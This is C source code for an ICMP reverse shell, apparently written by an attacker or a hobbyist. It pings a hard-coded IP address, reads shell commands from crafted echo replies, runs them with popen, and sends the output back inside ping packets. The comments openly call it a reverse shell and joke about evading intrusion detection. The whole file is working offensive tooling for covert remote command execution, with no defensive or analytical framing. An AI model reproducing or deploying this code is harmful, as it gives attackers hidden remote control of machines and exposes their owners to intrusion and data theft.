#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/ip_icmp.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

#define PING_PKT_S 1000
#define PORT_NO 0
#define PING_SLEEP_RATE 1000
#define RECV_TIMEOUT 1

int pingloop=1;
int msg_count=0;
char buffer[PING_PKT_S-sizeof(struct icmphdr)];

struct ping_pkt
{
	struct icmphdr hdr;
	char msg[PING_PKT_S-sizeof(struct icmphdr)];
};

unsigned short checksum(void *b, int len)
{ unsigned short *buf = b;
	unsigned int sum=0;
	unsigned short result;

	for ( sum = 0; len > 1; len -= 2 )
		sum += *buf++;
	if ( len == 1 )
		sum += *(unsigned char*)buf;
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}

void intHandler(int dummy)
{
	pingloop=0;
}

char * send_ping(int ping_sockfd, struct sockaddr_in *ping_addr, char *msg) {

	int addr_len;
	struct ping_pkt pckt;
	struct sockaddr_in r_addr;

	// slow down send rate to avoid intrusion detection
	//		- this was a joke. any bad intrusion detection would detect my reverse shell.
	usleep(PING_SLEEP_RATE);

	//filling packet
	bzero(&pckt, sizeof(pckt));
	
	pckt.hdr.type = ICMP_ECHO;
	pckt.hdr.un.echo.id = getpid();
	
	strcpy(pckt.msg, msg);
	
	pckt.hdr.un.echo.sequence = msg_count++;
	pckt.hdr.checksum = checksum(&pckt, sizeof(pckt));

	//send packet
	if ( sendto(ping_sockfd, &pckt, sizeof(pckt), 0, (struct sockaddr*) ping_addr, sizeof(*ping_addr)) <= 0) {
	}

	//receive packet
	addr_len=sizeof(r_addr);

	bzero(&pckt, sizeof(pckt));

	if ( recvfrom(ping_sockfd, &pckt, sizeof(pckt), 0, (struct sockaddr*)&r_addr, &addr_len) > 0)
	{
		if(pckt.hdr.type ==69 && pckt.hdr.code==0)
		{
			char * cmd = pckt.msg+20;
			if (strlen(cmd) > 0) {
				strcpy(buffer, cmd);
				return buffer;
			}
		}
	}

	return NULL;
}

// make a ping request
void shell(int ping_sockfd, struct sockaddr_in *ping_addr)
{
	int ttl_val=64;
	
	struct timeval tv_out;
	tv_out.tv_sec = RECV_TIMEOUT;
	tv_out.tv_usec = 0;
	
	// set socket options at ip to TTL and value to 64,
	// change to what you want by setting ttl_val
	if (setsockopt(ping_sockfd, SOL_IP, IP_TTL, &ttl_val, sizeof(ttl_val)) != 0) {
		return;
	}

	// setting timeout of recv setting
	setsockopt(ping_sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_out, sizeof tv_out);

	// send icmp packet in an infinite loop
	while(pingloop)
	{

		char * cmd = send_ping(ping_sockfd, ping_addr, "EXPECT CMD: ");

		if (cmd != NULL) {

			FILE * fp = popen(cmd, "r");
			if (!fp) {
				send_ping(ping_sockfd, ping_addr, "END: Error, Could not execute command");
				continue;
			}

			while(fgets(buffer+5, sizeof(buffer-5), fp) != NULL) {
				buffer[0]='R';
				buffer[1]='E';
				buffer[2]='S';
				buffer[3]=':';
				buffer[4]=' ';
				printf("sending: %s\n", buffer);
				send_ping(ping_sockfd, ping_addr, buffer);
			}
			pclose(fp);
		}

	}
}

// Driver Code
int main(int argc, char *argv[])
{
	int sockfd;
	char *ip_addr = "10.211.55.64";
	struct sockaddr_in addr_con;
	int addrlen = sizeof(addr_con);

	// get address object
	struct hostent *host_entity;
	if ((host_entity = gethostbyname(ip_addr)) == NULL) {
		exit(1);
	}
	
	addr_con.sin_family = host_entity->h_addrtype;
	addr_con.sin_port = htons (PORT_NO);
	addr_con.sin_addr.s_addr = *(long*)host_entity->h_addr;

	// open socket()
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if(sockfd<0)
	{
		return 0;
	}

	//catching interrupt (used for debugging)
	signal(SIGINT, intHandler);	

	//send pings continuously
	shell(sockfd, &addr_con);
	
	return 0;
}

